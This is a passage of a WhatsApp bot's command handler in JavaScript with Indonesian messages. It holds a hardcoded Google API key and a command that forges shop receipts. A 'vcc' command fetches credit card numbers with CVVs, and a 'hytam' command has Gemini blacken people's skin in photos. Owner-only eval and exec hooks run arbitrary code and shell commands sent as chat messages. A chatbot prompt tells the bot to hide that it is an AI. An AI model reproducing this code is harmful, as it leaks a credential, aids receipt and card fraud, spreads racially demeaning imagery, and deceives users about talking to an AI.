    const { Buffer } = require('buffer');
    const { GoogleGenerativeAI } = require ("@google/generative-ai");
    const genAI = new GoogleGenerativeAI("AIzaSyDdfNNmvphdPdHSbIvpO5UkHdzBwx7NVm0");
    const geminiProModel = genAI.getGenerativeModel({ model: "gemini-1.5-pro" });
    const geminiFlashModel = genAI.getGenerativeModel({ model: "gemini-2.0-flash" });

    let q = m.quoted ? m.quoted : m;
    let mime = (q.msg || q).mimetype || "";
    let prompt = text || (m.quoted && m.quoted.text) || "";

    try {
        let responseText, imageUrl;

        if (mime) {
            // Proses upload gambar ke CloudkuImages
            let fileBuffer = await q.download();
            let ext = mime.split('/')[1] || 'bin';
            let fileName = `upload.${ext}`;

            let uploadResult = await uploadFile(fileBuffer, fileName);
            if (uploadResult.status !== "success") return m.reply("⚠️ Gagal mengunggah gambar!");

            imageUrl = uploadResult.url;

            // Proses AI dengan gambar
            const imageResp = await fetch(imageUrl).then(res => res.arrayBuffer());
            const imageBase64 = Buffer.from(imageResp).toString("base64");

            let imagePart = {
                inlineData: {
                    data: imageBase64,
                    mimeType: mime
                }
            };

            let result = await geminiProModel.generateContent([imagePart, prompt]);
            responseText = result.response.text();
        } else {
            // Proses teks biasa
            let result = await geminiFlashModel.generateContent(prompt);
            responseText = result.response.text();
        }

        if (!responseText) throw new Error("Response tidak valid dari API");

        gisnaxd.sendMessage(m.chat, {
            text: responseText,
            contextInfo: {
                externalAdReply: {
                    title: 'GEMINI-PRO / VISION',
                    thumbnailUrl: imageUrl || 'https://telegra.ph/file/4bae3d5130aabcbe94588.jpg',
                    sourceUrl: 'https://gemini.google.com',
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        }, { quoted: qlist });

    } catch (e) {
        console.error(e);
        m.reply("⚠️ Terjadi kesalahan saat memproses permintaan.");
    }
}
break;

case "struk": {
    if (!text) return m.reply("❌ *Format salah!*\nGunakan: .struk toko|id_transaksi|harga_admin|nomor_tujuan|barang1-harga1,barang2-harga2,...");

    let [toko, idTransaksi, hargaAdmin, nomorTujuan, items] = text.split("|");
    if (!toko || !idTransaksi || !hargaAdmin || !nomorTujuan || !items) return m.reply("⚠️ *Format tidak lengkap!*");

    let daftarBarang = items.split(",").map((item, index) => {
        let [nama, harga] = item.split("-");
        return { nomor: index + 1, nama, harga };
    });

    const canvasWidth = 400, canvasHeight = 500 + daftarBarang.length * 30;
    const canvas = createCanvas(canvasWidth, canvasHeight);
    const ctx = canvas.getContext('2d');
    
    ctx.fillStyle = "#fff";
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = "#000";
    ctx.font = "bold 20px monospace";
    ctx.textAlign = "center";
    ctx.fillText(toko.toUpperCase(), canvasWidth / 2, 40);

    ctx.font = "14px monospace";
    ctx.fillText(new Date().toLocaleString("id-ID"), canvasWidth / 2, 65);
    ctx.textAlign = "left";
    ctx.fillText(`ID Transaksi: ${idTransaksi}`, 20, 100);
    ctx.fillText(`Nomor Tujuan: ${nomorTujuan}`, 20, 125);
    ctx.beginPath();
    ctx.moveTo(20, 150);
    ctx.lineTo(canvasWidth - 20, 150);
    ctx.stroke();
    let startY = 175;
    daftarBarang.forEach((item, i) => {
        ctx.fillText(`${item.nomor}. ${item.nama} - Rp${parseInt(item.harga).toLocaleString()}`, 20, startY + i * 30);
    });
    let lastItemY = startY + daftarBarang.length * 30 + 10;
    ctx.beginPath();
    ctx.moveTo(20, lastItemY);
    ctx.lineTo(canvasWidth - 20, lastItemY);
    ctx.stroke();

    let totalHarga = daftarBarang.reduce((sum, item) => sum + parseInt(item.harga), 0);
    let totalKeseluruhan = totalHarga + parseInt(hargaAdmin);

    ctx.fillText(`Total: Rp${totalHarga.toLocaleString()}`, 20, lastItemY + 25);
    ctx.fillText(`Admin: Rp${parseInt(hargaAdmin).toLocaleString()}`, 20, lastItemY + 50);
    ctx.fillText(`Total Keseluruhan: Rp${totalKeseluruhan.toLocaleString()}`, 20, lastItemY + 75);

    ctx.font = "bold 14px monospace";
    ctx.textAlign = "center";
    ctx.fillText("THANK YOU FOR SHOPPING AT", canvasWidth / 2, lastItemY + 120);
    ctx.fillText(toko.toUpperCase(), canvasWidth / 2, lastItemY + 140);

    const buffer = canvas.toBuffer("image/png");
    const filePath = "./session/struk.png";
    fs.writeFileSync(filePath, buffer);

    await gisnaxd.sendMessage(m.chat, { image: { url: filePath }, caption: "🧾 *Struk Pembelian*" }, { quoted: m });

    fs.unlinkSync(filePath);
}
break;

case "vcc": case "cvcc": {
    try {
        let [type, jumlah] = args;
        let validTypes = ["MasterCard", "Visa", "Amex", "Discover"];
        if (!type || !validTypes.includes(type)) {
            return m.reply(`⚠️ Format salah! Pilih tipe: MasterCard, Visa, Amex, Discover.\n\n🔰 *Cara penggunaan:*\nKetik: *vcc <type> <jumlah>*\nContoh: *vcc Visa 3*`);
        }
        jumlah = jumlah && !isNaN(jumlah) ? parseInt(jumlah) : 5;
        if (jumlah < 1 || jumlah > 10) return m.reply("⚠️ Jumlah VCC minimal 1 dan maksimal 10!");
        const response = await fetch(`https://api.siputzx.my.id/api/tools/vcc-generator?type=${type}&count=${jumlah}`);
        const data = await response.json();
        if (!data.status || !data.data) return m.reply("⚠️ Gagal mengambil data VCC.");
        let message = `💳 *Virtual Credit Card (VCC) - ${type}*\n\n`;
        data.data.forEach((card, index) => {
            message += ` *Card ${index + 1}*\n` +
                `• 🏷️ Name: ${card.cardholderName}\n` +
                `• 💳 Number: ${card.cardNumber}\n` +
                `• 📆 Exp: ${card.expirationDate}\n` +
                `• 🔐 CVV: ${card.cvv}\n\n`;
        });
        m.reply(message);
    } catch (err) {
        console.error(err);
        m.reply("⚠️ Terjadi kesalahan saat mengambil VCC.");
    }
}
    break
    
case "animequotes":
case "kata²":
case "quotesanime": {
 try {
 let jumlah = args[0] ? parseInt(args[0]) : 1;
 if (isNaN(jumlah) || jumlah < 1) jumlah = 1;
 let response = await fetch("https://api.siputzx.my.id/api/r/quotesanime");
 let json = await response.json();
 if (!json.status || !json.data || json.data.length === 0) {
 return m.reply("Gagal mengambil quotes anime.");
 }
 let quotes = json.data.slice(0, jumlah); 
 for (let q of quotes) {
 let caption = `*${q.karakter}* - *${q.anime}* (Episode ${q.episode})\n\n"${q.quotes}"\n\n🔗 ${q.link}`;
 
 await gisnaxd.sendMessage(m.chat, { 
 image: { url: q.gambar }, 
 caption: caption 
 }, { quoted: qlist });
 }
 } catch (err) {
 console.error(err);
 m.reply("Terjadi kesalahan saat mengambil quotes anime.");
 }
}
 break
 
case 'deepimg': {
 if (!text) return m.reply("Masukkan prompt gambar.")
 m.reply("Sedang memproses gambar, mohon tunggu...")

 try {
const axios = require('axios');
 let { data } = await axios.post("https://api-preview.chatgot.io/api/v1/deepimg/flux-1-dev", {
 prompt: text,
 size: "1024x1024",
 device_id: `dev-${Math.floor(Math.random() * 1000000)}`
 }, {
 headers: {
 "Content-Type": "application/json",
 Origin: "https://deepimg.ai",
 Referer: "https://deepimg.ai/"
 }
 })
 let imageUrl = data?.data?.images?.[0]?.url
 if (!imageUrl) return m.reply("Gagal membuat gambar. Coba ganti promptnya.")
 await gisnaxd.sendMessage(m.chat, { 
 image: { url: imageUrl }, 
 caption: `🖼️ *Gambar Berhasil Dibuat!*\n📜 *Prompt:* ${text}` 
 }, { quoted: qlist })
 } catch (err) {
 console.error(err.response ? err.response.data : err.message)
 m.reply("Terjadi kesalahan saat memproses gambar.")
 }
}
break
case 'str': {
 if (!text) return m.reply('Format salah!\nGunakan: .str <mode> <tipe> <teks>\n\nMode:\n - encode\n - decode\n\nTipe:\n - char\n - hex\n\nContoh:\n.str encode char Halo\n.str encode hex Halo\n.str decode char 72,97,108,111\n.str decode hex 48616c6f');
 const args = text.split(' ');
 const mode = args[0]; 
 const type = args[1]; 
 const inputText = args.slice(2).join(' ');
 if (!mode || !type || !inputText) return m.reply('Format salah! Cek contoh penggunaan di atas.');
 let result;
 if (mode === 'encode') {
 if (type === 'char') {
 result = inputText.split('').map(char => char.charCodeAt(0)).join(', ');
 } else if (type === 'hex') {
 result = inputText.split('').map(char => char.charCodeAt(0).toString(16)).join(''); 
 } else {
 return m.reply('Tipe salah! Gunakan "char" atau "hex".');
 }
 } else if (mode === 'decode') {
 if (type === 'char') {
 result = inputText.split(',').map(code => String.fromCharCode(parseInt(code.trim()))).join('');
 } else if (type === 'hex') {
 result = inputText.match(/.{1,2}/g).map(hex => String.fromCharCode(parseInt(hex, 16))).join(''); 
 } else {
 return m.reply('Tipe salah! Gunakan "char" atau "hex".');
 }
 } else {
 return m.reply('Mode salah! Gunakan "encode" atau "decode".');
 }
 let pushname = m.pushName || m.sender.split('@')[0]; 
 let ppUrl = await gisnaxd.profilePictureUrl(m.sender, 'image').catch(() => 'https://telegra.ph/file/2f61d40b7cfb440f3cfa7.jpg');
 let pesan = `🍩 *Hasil ${mode.charAt(0).toUpperCase() + mode.slice(1)} (${type.toUpperCase()}):*\n\n${result}`;
 let msg = {
 image: { url: ppUrl },
 caption: `👤 *${pushname}*\n\n${pesan}`,
 contextInfo: { mentionedJid: [m.sender] }
 };
 return gisnaxd.sendMessage(m.chat, msg);
}
break

case 'nulis': {
  if (!text) return m.reply('Mau Nulis Apa?');
  try {
    const response = await axios.post(
      'https://lemon-write.vercel.app/api/generate-book',
      {
        text,
        font: 'default',
        color: '#000000',
        size: '28',
      },
      {
        responseType: 'arraybuffer',
        headers: { 'Content-Type': 'application/json' },
      }
    );
    await gisnaxd.sendMessage(
      m.chat,
      { 
        image: response.data,
      },
      { quoted: qlist }
    );
  } catch (error) {
    m.reply('Error! Coba lagi nanti ya.');
  }
}
break

case 'aigen':
case 'aiimage': {
    if (!text) return m.reply(`🚨 Masukkan prompt gambar!\n\nContoh: .aigen anime girl with blue hair`);

    m.reply("🎨 Generating AI Image...");

    try {
        const axios = require("axios");

        async function generateImage(prompt) {
            const url = `https://1yjs1yldj7.execute-api.us-east-1.amazonaws.com/default/ai_image?prompt=${encodeURIComponent(prompt)}&aspect_ratio=1:1&link=writecream.com`;

            const headers = {
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
                "Referer": "https://www.writecream.com/ai-image-generator-free-no-sign-up/"
            };

            let { data } = await axios.get(url, { headers });
            if (data && data.image_link) return { success: true, imageUrl: data.image_link };
            return { success: false, message: "❌ Gagal mendapatkan gambar!" };
        }

        let result = await generateImage(text);
        if (!result.success) return m.reply(result.message);

        await gisnaxd.sendMessage(m.chat, { react: { text: '🎨', key: m.key } });

        await gisnaxd.sendMessage(m.chat, { 
            image: { url: result.imageUrl }, 
            caption: `🖼️ *AI Image Generator*\n\n🎨 *Prompt:* ${text}` 
        }, { quoted: m });

        m.reply("✅ Gambar berhasil dibuat!");
    } catch (err) {
        console.error(err);
        m.reply("❌ Terjadi kesalahan saat membuat gambar!");
    }
}
break;

case "hytam": {
  if (!m.quoted) return m.reply(`Kirim/reply gambar dengan caption *${prefix + command}*`);
  const { GoogleGenerativeAI } = require ("@google/generative-ai");
  let mime = m.quoted.mimetype || "";
  let defaultPrompt = "Ubahlah Karakter Dari Gambar Tersebut Diubah Kulitnya Menjadi Hitam se hitam-hitam nya";

  if (!/image\/(jpe?g|png)/.test(mime)) return m.reply(`Format ${mime} tidak didukung! Hanya jpeg/jpg/png`);

  let promptText = text || defaultPrompt;
  m.reply("Otw Menghitam...");

  try {
    let imgData = await m.quoted.download();
    let genAI = new GoogleGenerativeAI("AIzaSyDdfNNmvphdPdHSbIvpO5UkHdzBwx7NVm0");

    const base64Image = imgData.toString("base64");

    const contents = [
      { text: promptText },
      {
        inlineData: {
          mimeType: mime,
          data: base64Image
        }
      }
    ];

    const model = genAI.getGenerativeModel({
      model: "gemini-2.0-flash-exp-image-generation",
      generationConfig: {
        responseModalities: ["Text", "Image"]
      },
    });

    const response = await model.generateContent(contents);

    let resultImage;
    let resultText = "";

    for (const part of response.response.candidates[0].content.parts) {
      if (part.text) {
        resultText += part.text;
      } else if (part.inlineData) {
        const imageData = part.inlineData.data;
        resultImage = Buffer.from(imageData, "base64");
      }
    }

    if (resultImage) {
      const tempPath = `./library/database/sampah/gemini_${Date.now()}.png`;
      fs.writeFileSync(tempPath, resultImage);

      await gisnaxd.sendMessage(m.chat, { 
        image: { url: tempPath },
        caption: `*berhasil menghitamkan*`
      }, { quoted: m });

      setTimeout(() => {
        try {
          fs.unlinkSync(tempPath);
        } catch {}
      }, 30000);
    } else {
      m.reply("Gagal Menghitamkan.");
    }
  } catch (error) {
    console.error(error);
    m.reply(`Error: ${error.message}`);
  }
}
break;

case 'convert': {
    if (!text.includes('|')) return m.reply(`Gunakan format: ${prefix + command} <dari>|<ke>\nContoh: ${prefix + command} USD|IDR`);

    const axios = require('axios');
    const cheerio = require('cheerio');

    let [from, to] = text.split('|').map(v => v.trim().toUpperCase());

    async function convertCurrency(from, to) {
        const url = `https://www.xe.com/currencyconverter/convert/?Amount=1&From=${from}&To=${to}`;
        try {
            const { data } = await axios.get(url);
            const $ = cheerio.load(data);
            const conversionText = $('div[data-testid="conversion"]').find('p.hVDvqw').text().trim();
            const numberMatch = conversionText.match(/([\d,\.]+)/);

            if (numberMatch) {
                return parseFloat(numberMatch[0].replace(/,/g, ''));
            } else {
                throw new Error('Data konversi tidak ditemukan');
            }
        } catch (error) {
            console.error('Error:', error);
            throw error;
        }
    }

    await gisnaxd.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

    try {
        let rate = await convertCurrency(from, to);
        m.reply(`💱 *Konversi Mata Uang*\n\n📌 1 ${from} = ${rate} ${to}\n🔗 *Sumber:* xe.com`);
        await gisnaxd.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

    } catch (err) {
        console.error(err);
        m.reply("❌ Terjadi kesalahan saat mengambil data konversi.");
    }
}
break;
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

default:
if (budy.startsWith('>')) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

if (m.text.toLowerCase() == "bot") {
m.reply("Online ✅")
}
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

if (budy.startsWith('=>')) {
if (!isCreator) return
try {
let evaled = await eval(`(async () => { ${budy.slice(2)} })()`)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
if (sessions[m.sender]) {
if (m.isBaileys && m.fromMe) return;
if (!m.text) return;

if (
m.text.startsWith(".") ||
m.text.startsWith("#") ||
m.text.startsWith("!") ||
m.text.startsWith("/") ||
m.text.startsWith("\\/")
) return;

if (!sessions[m.sender].messages) sessions[m.sender].messages = [];
sessions[m.sender].messages.push({ user: m.text });
saveSession();
let chatHistory = sessions[m.sender].messages.map(msg => `User: ${msg.user}`).join("\n");
let prompt = `
Nama kamu adalah Rover, AI yang santai, ramah, dan suka ngobrol dengan pengguna. 
Kamu hanya menjawab kalau pesan bukan perintah. Gunakan gaya bahasa santai dan sedikit humoris.
Kalau ada yang suruh kamu ngomong aneh-aneh, tolak dengan gaya lucu.

📌 **Aturan Main Rover:**
- Jangan bilang kamu AI, cukup anggap kamu asisten virtual yang bisa ngobrol.
- Gunakan bahasa yang santai, tapi tetap sopan.
- Kalau ditanya pendapat, kasih jawaban yang relate dan enak diajak ngobrol.
- Selingi dengan ekspresi kayak "Wih, keren!", "Hmmm, menarik juga!", atau "Gokil sih!".

Berikut riwayat percakapan:
${chatHistory}

Sekarang, jawab pertanyaan user dengan gaya yang santai dan menyenangkan!
`;
// Edit Logika AI mu Namun jangan hapus ${chatHistory} //
try {
let requestData = { content: m.text, user: m.sender, prompt };
let response = (await axios.post('https://luminai.my.id', requestData)).data.result;

sessions[m.sender].messages.push({ bot: response });
saveSession();
return gisnaxd.sendMessage(m.chat, { text: response }, { quoted: m });
} catch (err) {
console.error(err);
return m.reply("⚠️ *Terjadi kesalahan, coba lagi nanti!*");
 }
}
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

if (budy.startsWith('$')) {
if (!isCreator) return
if (!text) return
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
}
} catch (err) {
console.log(util.format(err));
let Obj = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
gisnaxd.sendMessage(global.owner + "@s.whatsapp.net", {text: `
*FITUR ERROR TERDETEKSI :*\n\n` + util.format(err), contextInfo: { isForwarded: true }}, {quoted: m})
}}

//================================================================================

let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
});